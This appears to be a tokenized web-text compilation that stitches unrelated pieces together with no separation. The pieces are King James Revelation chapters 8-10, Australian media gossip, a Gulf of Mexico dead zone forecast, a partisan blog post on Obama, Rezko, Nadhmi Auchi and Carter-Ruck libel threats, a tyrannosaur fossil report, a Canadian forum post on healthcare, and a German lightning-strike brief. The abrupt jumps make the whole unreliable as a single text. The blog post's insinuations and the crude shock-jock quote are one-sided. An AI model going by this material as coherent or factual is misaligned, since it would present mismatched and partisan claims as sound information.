REV 8:2
And I saw the seven angels which stood before God ; and to them were given seven trumpets .
REV 8:3
And another angel came and stood at the altar , having a golden censer ; and there was given unto him much incense , that he should offer it with the prayers of all saints upon the golden altar which was before the throne .
REV 8:4
And the smoke of the incense , which came with the prayers of the saints , ascended up before God out of the angel 's hand .
REV 8:5
And the angel took the censer , and filled it with fire of the altar , and cast it into the earth : and there were voices , and thunderings , and lightnings , and an earthquake .
REV 8:6
And the seven angels which had the seven trumpets prepared themselves to sound .
REV 8:7
The first angel sounded , and there followed hail and fire mingled with blood , and they were cast upon the earth : and the third part of trees was burnt up , and all green grass was burnt up .
REV 8:8
And the second angel sounded , and as it were a great mountain burning with fire was cast into the sea : and the third part of the sea became blood ;
REV 8:9
And the third part of the creatures which were in the sea , and had life , died ; and the third part of the ships were destroyed .
REV 8:10
And the third angel sounded , and there fell a great star from heaven , burning as it were a lamp , and it fell upon the third part of the rivers , and upon the fountains of waters ;
REV 8:11
And the name of the star is called Wormwood : and the third part of the waters became wormwood ; and many men died of the waters , because they were made bitter .
REV 8:12
And the fourth angel sounded , and the third part of the sun was smitten , and the third part of the moon , and the third part of the stars ; so as the third part of them was darkened , and the day shone not for a third part of it , and the night likewise .
REV 8:13
And I beheld , and heard an angel flying through the midst of heaven , saying with a loud voice , Woe , woe , woe , to the inhabiters of the earth by reason of the other voices of the trumpet of the three angels , which are yet to sound !
REV 9:1
And the fifth angel sounded , and I saw a star fall from heaven unto the earth : and to him was given the key of the bottomless pit .
REV 9:2
And he opened the bottomless pit ; and there arose a smoke out of the pit , as the smoke of a great furnace ; and the sun and the air were darkened by reason of the smoke of the pit .
REV 9:3
And there came out of the smoke locusts upon the earth : and unto them was given power , as the scorpions of the earth have power .
REV 9:4
And it was commanded them that they should not hurt the grass of the earth , neither any green thing , neither any tree ; but only those men which have not the seal of God in their foreheads .
REV 9:5
And to them it was given that they should not kill them , but that they should be tormented five months : and their torment was as the torment of a scorpion , when he striketh a man .
REV 9:6
And in those days shall men seek death , and shall not find it ; and shall desire to die , and death shall flee from them .
REV 9:7
And the shapes of the locusts were like unto horses prepared unto battle ; and on their heads were as it were crowns like gold , and their faces were as the faces of men .
REV 9:8
And they had hair as the hair of women , and their teeth were as the teeth of lions .
REV 9:9
And they had breastplates , as it were breastplates of iron ; and the sound of their wings was as the sound of chariots of many horses running to battle .
REV 9:10
And they had tails like unto scorpions , and there were stings in their tails : and their power was to hurt men five months .
REV 9:11
And they had a king over them , which is the angel of the bottomless pit , whose name in the Hebrew tongue is Abaddon , but in the Greek tongue hath his name Apollyon .
REV 9:12
One woe is past ; and , behold , there come two woes more hereafter .
REV 9:13
And the sixth angel sounded , and I heard a voice from the four horns of the golden altar which is before God ,
REV 9:14
Saying to the sixth angel which had the trumpet , Loose the four angels which are bound in the great river Euphrates .
REV 9:15
And the four angels were loosed , which were prepared for an hour , and a day , and a month , and a year , for to slay the third part of men .
REV 9:16
And the number of the army of the horsemen were two hundred thousand thousand : and I heard the number of them .
REV 9:17
And thus I saw the horses in the vision , and them that sat on them , having breastplates of fire , and of jacinth , and brimstone : and the heads of the horses were as the heads of lions ; and out of their mouths issued fire and smoke and brimstone .
REV 9:18
By these three was the third part of men killed , by the fire , and by the smoke , and by the brimstone , which issued out of their mouths .
REV 9:19
For their power is in their mouth , and in their tails : for their tails were like unto serpents , and had heads , and with them they do hurt .
REV 9:20
And the rest of the men which were not killed by these plagues yet repented not of the works of their hands , that they should not worship devils , and idols of gold , and silver , and brass , and stone , and of wood : which neither can see , nor hear , nor walk :
REV 9:21 Neither repented they of their murders , nor of their sorceries , nor of their fornication , nor of their thefts .
REV 10:1
And I saw another mighty angel come down from heaven , clothed with a cloud : and a rainbow was upon his head , and his face was as it were the sun , and his feet as pillars of fire :
REV 10:2
And he had in his hand a little book open : and he set his right foot upon the sea , and his left foot on the earth ,
REV 10:3
And cried with a loud voice , as when a lion roareth : and when he had cried , seven thunders uttered their voices .
REV 10:4
And when the seven thunders had uttered their voices , I was about to write : and I heard a voice from heaven saying unto me , Seal up those things which the seven thunders uttered , and write them not .
REV 10:5
And the angel which I saw stand upon the sea and upon the earth lifted up his hand to heaven ,
REV 10:6
And sware by him that liveth for ever and ever , who created heaven , and the things that therein are , and the earth , and the things that therein are , and the sea , and the things which are therein , that there should be time no longer :
REV 10:7
But in the days of the voice of the seventh angel , when he shall begin to sound , the mystery of God should be finished , as he hath declared to his servants the prophets .
REV 10:8
And the voice which I heard from heaven spake unto me again , and said , Go and take the little book which is open in the hand of the angel which standeth upon the sea and upon the earth .
REV 10:9
And I went unto the angel , and said unto him , Give me the little book .
And he said unto me , Take it , and eat it up ; and it shall make thy belly bitter , but it shall be in thy mouth sweet as honey .
REV 10:10
And I took the little book out of the angel 's hand , and ate it up ; and it was in my mouth sweet as honey : and as soon as I had eaten it , my belly was bitter .
REV 10:11
And he said unto me , Thou must prophesy again before many peoples , and nations , and tongues , and kings .

Sunrise nicks The Gruen Transfer .
Sunrise on the Seven Network is a program under pressure , darting from fad to fad as the revitalised Today Show on Nine attempts a comeback .
After spending the best part of a year away from his baby , executive producer Adam Boland has been told to go back and fight off the David Gyngell hordes .
Boland is desperate , his reputation as a wunderkind is on the line .
He came up with the idea “ Reject the Recession ” , which was launched to fanfare on Monday morning and continued this morning .
One of the Reject the Recession segments on Monday morning featured a direct steal of talent and ideas from the Gruen Transfer on the ABC on Wednesday nights .
Boland pinched three of the talent of Gruen ( when the two stars were not available ) and then got them to come up with marketing campaigns and slogans for rejecting the Recession .
And look at the rip off video .
Boland tried to get Russel Howcroft and Tod Sampson , the two main talent of Gruen , but they were on an ABC table at The Logies , so they went for the three other regulars , Jane Caro , Matt Eastwood and Dan Gregory .
There ’s nothing new under the sun in TV ( except original programs like Gruen ) , so imitation is to be expected .
It ’s part and parcel of a still competitive industry , especially as the Seven Network has turned Sunrise into one of its most profitable programs .

Laziness also comes to mind and that ’s what Sunrise has become in recent months , as well as complacent in the face of Today ‘s steady climb back up the ratings ladder .
The Gruen Transfer averaged around 1.2 million viewers last week , Sunrise is averaging just under 400,000 a morning , down to around 320,000 on a quite morning .
Today is back over the 300,000 mark consistently .

APN cuts profit forecast : The Australian arm of London - based Independent News & Media , APN News and Media , has cut its 2009 profit forecast for a second time in three months , as the impact of the recession increases .
The company ’s AGM was told today by new chairman , Gavin O’Reilly ( son of founder , Sir Tony O’Reilly who is planning to step down from INM later in the year ) that the new profit range would be $ 100 to $ 110 million , compared with the 2008 result of $ 140 million :
When releasing the 2008 full year results in February , the Board indicated that Net Profit After Tax ( pre-Non Recurring Items ) for 2009 was expected to be around $ 20 m lower than the 2008 result of $ 140 m , with the majority of the shortfall occurring in the first half .
Whilst it is difficult to forecast with confidence due to the current market conditions , Directors now expect that , assuming advertising and credit markets do not deteriorate further , the full year NPAT ( pre-NRI ) to be in the range of $ 100 million to $ 110 million .
Consistent with previous comments , the majority of the shortfall will occur in the first half of 2009 when results are being compared with a near record 2008 performance , with NPAT ( pre-NRI ) expected to be around $ 40 million .
In terms of the second half , it is important to remember that profit for the second half of 2008 , unlike the first , was severely impacted by the Global Financial Crisis and was well down on 2007 .
As a result , we do not expect to see similar year - on - year declines in our H2 results .
In 2008 , APN reduced its full year dividend payout by 29 % to 22.5 cents , which means lower income for INM for its 39.1 % stake .
Every buck helps , and even though INM tried to sell its APN stake last year ( and got no real bites ) , Mr O’Reilly expressed continuing support for APN .
The earnings downgrade is important because for quite a while some analysts believed that regional media were better placed than metro media .
APN is very strong in Queensland where the resources boom ( especially coal mining and and base metals ) have been hit by production cuts , mine closures and rising job losses ) .

Sweethearts and a -seholes of Darwin media .
Pete Davies , local Darwin shock jock , last week referred to former ABC journalist and now childrens ’
Services minister , Malarndirri McCarthy as “ sweetheart ” .
Here ’s what he had to say this morning on 104.9 MIX FM :
In Saturday ’s paper there was a piece in NT & Beyond with regards to me calling Malarndirri McCarthy “ sweetheart ” .
I ’d just like to clarify something .
I have a lot of friends on both sides of politics ; I have a lot of friends in the media even though we are competitors , we also are friendly to each other .
And I have known Malarndirri McCarthy for a long time , we first met when she was with the ABC and it goes back a long way and I class her as a very dear friend , whenever I see her I refer to her as sweetheart .
And the fact that someone got out of shape over that , excuse me , for crying out loud get a life .
I called her sweetheart because she is an absolute sweetheart .
What do you want me to call her — an a -sehole ?

Fairfax business journalists in New Zealand appear to have channelled the editorial values of Zoo Weekly .
Today they produced this tabloid shocker :

What does Michael Gill think ?
Is Brian McCarthy proud of this sort of journalism ?
What about board directors : chairman Ron Walker and the longest serving director Julia King ?
Media Watchdog needs media watching .
Gerard Henderson ’s online pamphlet Media Watchdog , this week is headlined “ SALLY ’S IN THE ( EXIT ) ALLEY — AND NANCY ’S ON THE GAME “ .
Given that Nancy is Henderson ’s dog , it is more than troubling that said mastiff is “ on the game ” ; hopefully Gerard is not living off the immoral earnings .
More amusingly , Henderson scolds Bob Ellis for writing ( a mere seven years ago ) that Churchill was alive in 1974 when in fact he died in 1965 .
The egregiousness of Ellis ’ error is moderated somewhat when Henderson writes about former Monthly editor Sally Warhaft appearing on “ Jon Faine ’s ABC Radio 702 program in Melbourne ” .
There is no such station .
The ABC frequency in Melbourne is 774 and has been since 1978 .
From 1935 - 78 ( a period during which the young Gerard grew up in Melbourne ) it was 770 kHz.
Presumably the error is not evidence of Henderson ’s Sydneycentrism but due to something misleading Robert Manne may or may not have said to him in the University of Melbourne Union Building in 1968 .
Will ( or should ? ) compassion save the newspaper industry ?
Was the collapse of newspaper business model inevitable ?
No , it was n’t .
They owe it to themselves .
They did n’t cause their own demise but stood by , ignorant , arrogant and too proud to do anything about it , as the world changed .
These newspapers refused to evolve .
They refused to acknowledge the fact that the world is changing .
They thought they were big , powerful and strong enough to stay relevant .
Unfortunately for the newspaper industry survival of the fittest is n’t about strength but about who is most adaptable to change .

The coming end of YouTube , Twitter and Facebook socialism .
Last week , according to the Times of London , Cardinal Sean Brady of Ireland told the country ’s Catholics to “ Make someone the gift of a prayer through text , Twitter or e-mail every day .
Such a sea of prayer is sure to strengthen our sense of solidarity with one another . ”
Oh , my .
That ’s a nice sentiment , but Twitter really does n’t need more users around the world tweeting in ways that can never be monetized .
The Vatican counts more than a billion baptized Catholics worldwide .
If the pope endorsed tweeting prayer , Twitter could be out of business by the end of the year !

University of Michigan aquatic ecologist Donald Scavia and his colleagues say this year 's Gulf of Mexico " dead zone " could be one of the largest on record , continuing a decades - long trend that threatens the health of a half - billion - dollar fishery .
The scientists ' latest forecast , released June 18 , calls for a Gulf dead zone of between 7,450 and 8,456 square miles — an area about the size of New Jersey .
Most likely , this summer 's Gulf dead zone will blanket about 7,980 square miles , roughly the same size as last year 's zone , Scavia said .
That would put the years 2009 , 2008 and 2001 in a virtual tie for second place on the list of the largest Gulf dead zones .
It would also mean that the five largest Gulf dead zones on record have occurred since 2001 .
The biggest of these oxygen - starved , or hypoxic , regions developed in 2002 and measured 8,484 square miles .
" The growth of these dead zones is an ecological time bomb , " said Scavia , a professor at the U - M School of Natural Resources and Environment and director of the U - M Graham Environmental Sustainability Institute .
" Without determined local , regional and national efforts to control them , we are putting major fisheries at risk , " said Scavia , who also produces annual dead - zone forecasts for the Chesapeake Bay .

The Gulf dead zone forms each spring and summer off the Louisiana and Texas coast when oxygen levels drop too low to support most life in bottom and near - bottom waters .
The Gulf hypoxia research team is supported by the U.S. National Oceanic and Atmospheric Administration 's Center for Sponsored Coastal Ocean Research and includes scientists from Louisiana State University and the Louisiana Universities Marine Consortium .
The forecast for a large 2009 Gulf hypoxic zone is based on above - normal flows in the Mississippi and Atchafalaya rivers this spring , which delivered large amounts of the nutrient nitrogen .
In April and May , flows in the two rivers were 11 percent above average .
Additional flooding of the Mississippi since May could result in a dead zone that exceeds the upper limit of the forecast , the scientists said .
" The high water - volume flows , coupled with nearly triple the nitrogen concentrations in these rivers over the past 50 years from human activities , has led to a dramatic increase in the size of the dead zone , " said Gene Turner , a lead forecast modeler at Louisiana State University .

Northeast of the Gulf , low water flows into the Chesapeake Bay shaped Scavia 's 2009 forecast for that hypoxia zone .
The Bay 's oxygen - starved zone is expected to shrink to between 0.7 and 1.8 cubic miles , with a " most likely " volume of 1.2 cubic miles — the lowest level since 2001 and third - lowest on record .
The drop is largely due to a regional dry spell that lasted from January through April , Scavia said .
Continued high flows in June , beyond the period used for the forecasts , suggest the actual size may be near the higher end of the forecast range .
" While it 's encouraging to see that this year 's Chesapeake Bay forecast calls for a significant drop in the extent of the dead zone , we must keep in mind that the anticipated reduction is due mainly to decreased precipitation and water runoff into the Bay , " he said .
" The predicted 2009 dead - zone decline does not result from cutbacks in the use of nitrogen , which remains one of the key drivers of hypoxia in the Bay . "
Farmland runoff containing fertilizers and livestock waste — some of it from as far away as the Corn Belt — is the main source of the nitrogen and phosphorus that cause the Gulf of Mexico dead zone .
Each year in late spring and summer , these nutrients make their way down the Mississippi River and into the Gulf , fueling explosive algae blooms there .
When the algae die and sink , bottom - dwelling bacteria decompose the organic matter , consuming oxygen in the process .
The result is an oxygen - starved region in bottom and near - bottom waters : the dead zone .
The same process occurs in the Chesapeake Bay , where nutrients in the Susquehanna River trigger the event .
In both the Gulf and the Bay , fish , shrimp and crabs are forced to leave the hypoxic zone .
Animals that cannot move perish .
The annual hypoxia forecasts helps coastal managers , policy makers , and the public better understand what causes dead zones .
The models that generate the forecasts have been used to determine the nutrient - reduction targets required to reduce the size of the dead zone .
" As with weather forecasts , the Gulf forecast uses multiple models to predict the range of the expected size of the dead zone .
The strong track record of these models reinforces our confidence in the link between excess nutrients from the Mississippi River and the dead zone , " said Robert Magnien , director of NOAA 's Center for Sponsored Coastal Ocean Research .
U.S. Geological Survey data on spring river flow and nutrient concentrations inform the computer models that produce the hypoxia forecasts .
The official size of the 2009 hypoxic zone will be announced following a NOAA - supported monitoring survey led by the Louisiana Universities Marine Consortium on July 18 - 26 .
In addition , NOAA 's Southeast Area Monitoring and Assessment Program's ( SEAMAP ) is currently providing near real - time data on the hypoxic zone during a five - week summer fish survey in the northern Gulf of Mexico .

Why is there so little media investigation of the financing behind Barack Obama ’s early political sponsor — and now convicted felon — Tony Rezko ?
The dual US - Syrian citizen Rezko -- who assisted Obama in the purchase of his Chicago mansion -- was heavily funded by loans from Iraqi - British ex-Baathist billionaire Nadhmi Auchi .
According to testimony at Rezko ’s trial , Obama met Auchi at an April 3 , 2004 event at Rezko ’s home during Obama ’s 2004 US Senate campaign .
The Times of London reports discovering , “ state documents in Illinois recording that Fintrade Services , a Panamanian company , lent money to Mr. Obama ’s fundraiser in May 2005 . ”
Fintrade directors , according to The Times “ include Ibtisam Auchi , the name of Mr. Auchi ’s wife ” .
Media bias is an easy — and intellectually lazy -- explanation .
Journalists digging into stories involving Auchi often find themselves peppered with threats of libel litigation from a London law firm known as Carter - Ruck .
Hawai'i Free Press has received several such letters .
In a free society , one might expect reporters confident of the accuracy of their reporting to shrug off such threats .
But Auchi ’s attorneys are operating under the laws of an increasingly un - free society — England .
Auchi ’s litigation threats have chased eight articles from the internet sites of the UK Guardian , Observer and New Statesman .
Sweden - based website Wikileaks has posted the eight articles but writes :
“ The censorship of The New Statesman 's political editor , Martin Bright , who was co-author for some of the Guardian and Observer articles , is particularly galling .
In April Mr. Bright warned New Statesman readers about the censorship of the Guardian and Observer in an article on the Index on Censorship 's annual Freedom of Expression Awards ( one of which was won by Wikileaks ) .
Then , in a bow to Kafka 's The Trial , Mr. Bright 's warning was in its turn censored by legal threats from Auchi . ”
Wikileaks itself is now under legal attack by Auchi ’s lawyers .
What is so stifling about English libel law ?
Carter - Ruck explains on its own website :
“ A libel claimant does not have to prove that the words are false or to prove that he has in fact suffered any loss .
Damage is presumed . ”
In a December , 2003 , obituary , former C - R partner David Hooper wrote :
“ The libel lawyer Peter Carter - Ruck , who died on Friday , had a chilling effect on the media .
He was a chancer , out for the maximum fee .
And he did for freedom of speech what the Boston Strangler did for door - to - door salesmen . ”
Posted on the Carter - Ruck website , an article by C - R partner Nigel Tait outlines four very specific “ matters the courts consider suitable for injunction . ”
These include “ unauthorized topless shots of women … . ”
Tait then points out that in spite of these limited legal bases for “ prior restraint ” some publishers can be convinced to censor themselves by “ the first two ( sic ) weapons of the Spanish Inquisition .
Fear , surprise and ruthless efficiency . ”
( UPDATE : The Tait article has now vanished from the CR website , but readers can still see it HERE )
Perhaps hoping to inspire “ fear and surprise ” with “ ruthless efficiency ” Carter - Ruck demand letters — laden with misspellings and what appear to be cut - and - paste formulations -- have been going out not only to large British newspapers , but also to American newspapers and both well - known and obscure bloggers .
April 23 , 2008 — in the midst of the US Presidential race -- an article on Auchi ’s Middle East Online website boasted of knocking articles off of the Guardian and Observer websites .
Bloggers began receiving Carter - Ruck letters demanding that allegedly defamatory comments be removed from their comments section .
MEO displayed a sphinx - like image of Auchi .
The caption : " Tracking even the search engines . "
It worked .
When the November election came and went , the American public barely knew Rezko and knew Auchi even less .
Obama won .
Hawai'i Free Press received an emailed letter from Carter - Ruck February 10 , 2009 .
It was followed by faxes and mailings .
Then the phone calls started .
C- R staffer Nuala Guiney rang this writer ’s cell phone at 1 AM and again at 5 AM one morning .
The demand : “ cease publishing these false and defamatory allegations about our client by forthwith removing them . ”
C - R also claims :
“ You should be aware that our client has lived and worked in England for over 25 years and that your article is likely to have been read by a substantial number of readers in England .
Accordingly , in relation to publication of the article in England , it will be subject to English law and the jurisdiction of the court in England . ”
The letter is labeled “ Not for Publication ” .
Like many of the things one finds under a rock , Carter - Ruck ’s “ fear and surprise ” works better in secret .
Like
Tait ’s article , this is a sign of weakness on their part .
Their letter was sent to a publication and concerns matters of public interest .
Hawai'i Free Press is not bound by such unilateral declarations .
The Carter - Ruck letters are published along with the reply from Hawai'i Free Press attorneys in pdf file at this link .
In response The Legal Project of the Middle East Forum assisted Hawai'i Free Press in obtaining representation .
According to its website , “ The Legal Project , as part of the Middle East Forum , aims to protect researchers and analysts who work on the topics of terrorism , terrorist funding , and radical Islam from lawsuits designed to silence their exercise of free speech . ”
Volunteering his services : Chicago attorney Timothy Kapshandy and a team from Sidley Austin .
Concerned attorneys are not alone is stepping forward .
In the U.S. efforts are underway to prevent foreign court libel judgments from infringing on the First Amendment guarantees of press freedom .
On May 7 , 2008 Senator Joseph Lieberman ( I - CT ) was among those announcing introduction of the Free Speech Protection Act which has been referred to the Senate Judiciary Committee for consideration .
He explained : “ The United Kingdom has become a popular venue for defamation plaintiffs from around the world , because under English law it is not necessary for a libel plaintiff to prove falsity or actual malice as is required in the United States . ”
Senator Lieberman ’s Free Speech Protection
Act is modeled on “ Rachel ’s Law ” signed April 30 , 2008 by New York Governor David Paterson .
Rachel ’s Law had passed both houses of the New York state legislature unanimously March 31 after being introduced with bi-partisan support .
“ Rachel ” is Rachel Ehrenfeld , an investigative journalist and author of Funding Evil : How Terrorism is Financed and How to Stop It .
Ehrenfeld ’s 2003 book , published in the U.S. , pointed to Saudi multi-millionaire Khalid Salim Bin Mahfouz as a funding source for al - Qaeda prior to 9 - 11 .
Mahfouz sued .
He is Saudi ; the book , its author and publisher are American ; but rather than coming to a U.S. court , Mahfouz selected English jurisdiction in a typical case of “ libel tourism . ”
Ehrenfeld did not answer the English suit and instead countersued in U.S. federal court .
The Illinois legislature has now passed a similar law and California legislators are considering following suit with SB 320 .
The Los Angeles Times April 9 editorialized : “ Some public figures are using England 's plaintiff - friendly laws to go after books they do n't like .
New York and Illinois have come to the defense of U.S. writers .
Congress and California should too . ”
The UK Guardian reports :
A cross-party trio of influential MPs has urged the government to implement radical reforms of Britain 's much - criticized libel laws , including the " international scandal " of libel tourism , which allows wealthy foreigners to sue in the English courts for material published abroad .
Their initiative is the first salvo in series of impending inquiries aimed at scrutinizing the laws of defamation , which have been widely attacked as a limitation on free speech .
In a House of Commons debate on Wednesday , the MPs , Labour 's Dennis MacShane , the Conservatives ' Michael Gove and the Liberal Democrats ' Norman Lamb , won some concessions from the government ….
Norman Lamb said he was concerned about how the libel laws act as a constraint on investigative reporting and referred to the case of the British Iraqi billionaire Nadhmi Auchi .
He said : " He is a British citizen – an Iraqi exile – and he is reported to be a multibillionaire .
He was convicted in France in 2003 of fraud in a trial involving the oil company Elf .
Importantly , he continues to assert his innocence of the charges – there was a conviction , but he is pursuing routes of appeal against it .
He was barred from entering the United States in 2005 .
" My interest in the matter is in his connections to Tony Rezko , who was convicted of fraud , money laundering and bribe - related charges in Illinois , and who is currently in prison pending sentencing .
We understand that sentencing has been delayed , and it has been suggested that he should talk to federal prosecutors , especially about allegations against Illinois governor [ Rod ] Blagojevich , which are being investigated .
" There is political interest in the US because of the connections between Rezko and President - elect Obama .
I make no allegation at all relating to the latter .
" There have been reports that a company related to Mr Auchi registered a loan of $ 3.5 m to Tony Rezko on 23 May 2005 .
That and other alleged connections are obviously of great interest to investigative journalists and others .
More to the point , it is legitimate to investigate such a matter , given that Auchi is a prominent British citizen with political connections in this country and overseas .
As I said , it is not appropriate to go into more detail , but it is alleged that Mr Auchi and his lawyers , Carter - Ruck , have been making strenuous efforts to close down public debate .
Of course , it is absolutely legitimate for any citizen to demand accurate and rigorous investigation and reporting .
The question is whether UK libel laws have the disproportionate effect of discouraging legitimate reporting .
Many believe that they do . "
The three MPs are going to meet a lot of resistance .
As Auchi’s General Mediterranean Holdings website explains :
“ On the 20th Anniversary of the founding of GMH , Nadhmi Auchi was presented with a painting of the Houses of Parliament signed by the Prime Minister , the Leaders of the Opposition parties and 130 Ministers & Members of Parliament in recognition of his outstanding achievements within and outside the United Kingdom . ”
In response to the Carter - Ruck letters Hawai'i Free Press re-researched its article and made one change to reflect conflicting information about whether Auchi ’s General Mediterranean Holdings owns stock in BNP - Paribas , a leading French bank .
The article remains posted online : Lehman Brothers : Obama ’s Rezko - Auchi conflict of interest .
Carter - Ruck claims , “ it is untrue that our client is the largest private shareholder in BNP Paribas . ”
But the website of Auchi’s Luxembourg - based " Compagnie Internationale de Participations Bancaires en Financières SA " ( CIPAF ) boasts , “ Until the merger of BNP and Paribas , the Cipaf group was one of the largest independent shareholders of Compagnie Financière de Paribas .
Since the merger , it ranks amongst the topmost investors in the enlarged BNP Paribas , now a leading European banking group . ”
Perhaps Carter - Ruck should sue Auchi for defaming himself .
If that sounds absurd consider this item from the former C - R partner , Hooper :
“ I left his firm in pure Carter - Ruck circumstances .
( Book publisher ) Heinemann , for whom we acted , was publishing a book about the Ford family , by Robert Lacey .
I was told by Carter - Ruck that there was no conflict in our advising .
Lacey sent part of the book to Henry Ford for comment .
Later I found Carter - Ruck advising
Ford that the book was full of libel .
He proved unable to give a truthful explanation . ”
The letter asserts nine points which it calls “ highly defamatory and false . ”
This is typical Carter - Ruck style .
A C-R letter to The New Statesman contains ten pages of “ It is untrue ” -- including 14 points denying this writer ’s August 24 , 2008 Accuracy
In Media article titled , “ Iraqi Billionaire Threatens Reporters Investigating Rezko Affair . ”
There are several such “ Not for Publication ” Carter - Ruck letters posted online by bloggers at TheRealBarackObama , RezkoWatch , AJacksonian , and NoQuarterUSA — where C- R actually demanded removal of comments to a blog post .
This writer is researching the nine points made in the C - R letter and will soon publish a detailed analysis of each with supporting links to primary sources and media articles which have withstood threats from C - R .
If C - R can use cookie - cutter letters to intimidate , then researchers and journalists can certainly save a lot of time and effort by supplying carefully researched and documented cookie - cutter answers .
Stay tuned .

Scientists are building a family tree for Tyrannosaurus rex Fossils found in China may give clues to the evolution of Tyrannosaurus rex .
Uncovered near the city of Jiayuguan , the fossil finds come from a novel tyrannosaur dubbed Xiongguanlong baimoensis .
The fossils date from the middle of the Cretaceous period , and may be a " missing link " , tying the familiar big T. rex to its much smaller ancestors .
The fossils show early signs of the features that became pronounced with later tyrannosaurs .
Paleontological knowledge about the family of dinosaurs known as tyrannosaurs is based around two distinct groups of fossils from different parts of the Cretaceous period , which ran from approximately 145 to 65 million years ago .
One group dates from an early part of the period , the Barremian , and the other is from tens of millions of years later .
Physical form
Before now it has been hard for palaeontologists to trace the lineage from one group to the other .
" We 've got a 40 - 50 million year gap in which we have very little fossil record , " said Peter Makovicky , associate curator at the Field Museum in Chicago , who helped to lead the US / Chinese team that uncovered the fossil .
Hadrosaurs - duck - billed dinosaurs - spread rapidly in the late Cretaceous But , he said , X baimoensis was a " nice link " between those two groups .
" We 're filling in that part of the fossil record , " he said .
Writing in the Royal Society 's journal Proceedings B , Dr Makovicky and colleagues suggest that X baimoensis is a " phylogenetic , morphological , and temporal link " between the two distinct groups of tyrannosaurs .
The fossil has some hallmarks of large tyrannosaurs such as a boxy skull , reinforced temple bones to support large jaw muscles , modified front nipping teeth and a stronger spine to support a large head .
But it also shows features absent from older tyrannosaurs , such as a long thin snout .
An adult would have stood about 1.5 m tall at the hip and weighed about 270kg .
By contrast , an adult T. rex was about 4 m tall at the hip and weighed more than 5 tonnes .
Wider net
The same edition of Proceedings B features papers about two other sets of dinosaur fossils .
One discovery was made in China by many of the palaeontologists who found the tyrannosaur .
The samples found in the Yujingzi Basin came from a dinosaur that resembled the modern ostrich .
While many of these ornithomimosaurs have been found before , analysis of the bones of the new species , dubbed Beishanlong grandis , suggest it was one of the biggest .
The specimen found by the palaeontologists was thought to be 6 m tall and weigh about 626 kg .
Alongside in Proceedings B was work on the remains of a duck - billed dinosaur found in Uzbekistan called Levnesovia transoxiana .
Analysis of the fossils , by Hans - Dieter Sues of the Smithsonian in Washington and Alexander Averianov of the Russian Academy of Sciences , may shed light on the waves of expansion hadrosaurs undertook during the late Cretaceous .

Hey there !
Good for you on actually seeking out answers and stuff !!
Do you know how many people ACTUALLY do that ?
- Hardly anyone .
Anyway , let 's share some thoughts shall we ?
I live near Toronto , Ontario Canada - and have lived within a several hours of here my whole life ( except for a year when I lived in the prairies ) ...
Here 's my thoughts on our healthcare .
First , when comparing what Republican / Far - right folk have said about Universal Healthcare and what Michael Moore has said , Michael Moore is MUCH closer to the truth about universal healthcare than the republicans .
But neither are 100 % correct in my experience .
That said , I 'll boil down some facts :
- Every Canadian is thankful for and while many would like to see the system run even better , any " improvements " are only hoped for as improvements to the existing system .
- I 've never heard of ANYONE wanting to dump the universal healthcare idea .
- Our system works VERY VERY VERY well when it comes to " General " Healthcare and Emergencies .
( E.g. : Broken bones , doctor check ups , to heart attacks , trauma etc etc . )
The system still functions , but most of the complaints occur when it comes to Long Term Care ... E.G. : surgeries , disease treatments , M.R.I.s etc .
You will still be treated and you will still be covered but you may have to wait a while before your turn is up .
( 3 years ago , I needed a colonoscopy - info you did n't need , I realize , but anyway ) - Anyhow , when my colonoscopy was booked , it was for 5 months down the road .
If you need an MRI , be prepared to wait much longer .
I 've known some people just bite the bullet , go to the States , pay the huge bill and have it done within days .
- Not everything is free :
Medicine = not covered .
Physiotherapy = not covered .
The eye doctor = not covered .
Psychology appointments = not covered .
Dentist = not covered .
What is covered ?
- Almost everything else .
All Family Doctor visits , Emergency room visits , Emergency care , Ear nose throat doctors , most specialists ( my colonoscopy for example = free ) , check ups , vaccinations ( necessary ones ) , booster shots , if you 're required to stay at the hospital , that 's free too ( mind you , you 'll be nursed back to reasonable health and released - instead of being kept as long as you want . )
So , for example , if you got into a car accident and had your body all gashed up and your bones broken , it would cost you nothing to be brought back to health .
You may have to pay 50 bucks for an ambulance ride and physio if you went afterwards . )
- the only inaccuracy I saw with Michael Moore 's film was you can wait for a WHILE in an emergency room at a hospital - IF YOU ARE NOT THERE FOR AN EMERGENCY .
One flaw in the system is : stupid people ( which I think are everywhere ) sometimes go to the Emergency for anything and everything .
They tend to clog the system sometimes .
But thankfully , the hopsital is happy to let them WAAAAAAIIITTT a LOOOOOONG time .
If you are not at the emergency room for a life threatening problem , you may be waiting for a while ( 30 minutes to a few hours ) .
However , please do n't listen to the right wing when they say that a socialized system is bad and it's more " American " to use your current system .
Because your system , I can't see as anything other than inhumane and criminal .
I do n't care what 's happening : a system where healthcare would be denied to a human being because they do n't have money is nothing but a flawed , twisted system .
In that sense , Michael Moore was right , your HMOs ( there 's no such thing here ) are obliged by law to provide stock holders with the most money possible .
- and that 's done by not dishing out the money that comes in .
Simple as that .
His anaology of the firefighters is spot on : Firefighters refusing to put out a fire until someone paid them money is ridiculous .. and this is n't a house you 're talking about - it 's your HEALTH !
No one will deny that the States has first class health care FACILITIES - they really are top notch .
But sadly , they are out of reach for many people .
Here 's the ' money ' sentence :
Healthcare should n't be " affordable " , it should be Provided .
We 're all human , we all have the right to keep living .
A few months ago during the Presidential Campaign , I watched John McCain talking to his supporters about healthcare and saying that a universal healthcare system would result in the government telling you when you will or wo n't recieve care .
And that , my dear intellectual - seeking friend , is total horse s*h * *t .
Do n't listen to it .
I 've NEVER been told when I will or wo n't need care : - If I 've needed it , I 've got it .
**** Our government does NOT decide if they will spend the money on me .
If a doctor thinks I need care , I get it - He does n't need to ask , he does n't make a phone call , he does n't do anything - he just makes me better .
It 's one human being , healing another .
PERIOD .
The government pays him to do it .****
Decisions are made BY DOCTORS --- NOT ---- the government as your politicians would have you think .
So while I wish some things would happen faster and while I wish that medicine was covered as well - take note of this :
If Canada decided to drop their universal Healthcare System , I would explore my options and look into revoking the citizenship of my country .
You can quote me on that .
It means that much .
I love my country .
My country - literally - takes care of me .
I hope this helps and provides you with an idea of what you may be missing in your understanding of universal healthcare .
Again , I applaud your willingness to seek out answers from beyond what 's been just handed to you .
All the very best to you .
May good health find you .
Lightning Strike Injures 26 Soccer Players
In Germany , Temporarily Killing One
A freak storm sent lightning crashing down on the field where teenagers were warming up for a soccer match in Ingoldingen , Germany over the weekend .
A total of 26 players were injured in the lightning strike , including 3 who were seriously hurt .
One kid , 17 - year - old Rolf Baader , actually died on the pitch , but paramedics managed to bring him back to life .
He was then rushed to the hospital by helicopter .
The players who were most seriously hurt happened to be standing next to a metal fence .
